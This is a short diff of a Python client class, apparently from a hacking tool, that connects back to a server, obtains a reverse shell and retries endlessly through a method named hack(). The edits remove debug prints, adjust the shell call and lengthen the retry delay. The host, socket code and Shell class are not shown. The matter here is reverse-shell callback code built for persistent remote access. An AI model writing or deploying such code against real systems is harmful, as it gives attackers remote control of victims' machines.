@@ -32,19 +32,18 @@ class Client:
         # Open socket connection back to server
         sock = client.connect()
         
-        print("b")
         # Create shell instance
         shell = Shell(sock)
+        
         # Get a reverse shell back to server
         try:
-            shell.get_shell(sock)
-            print("Shelsfgsagl")
+            shell.get_shell()
         except:
-            time.sleep(0.1) # Wait 5s
+            print(Exception)
+            time.sleep(5) # Wait 5s
             sock.close() # Close erroneous connection
             self.hack() # Retry
         
-        print("a")
         # Close connection when finished
         sock.close()
             
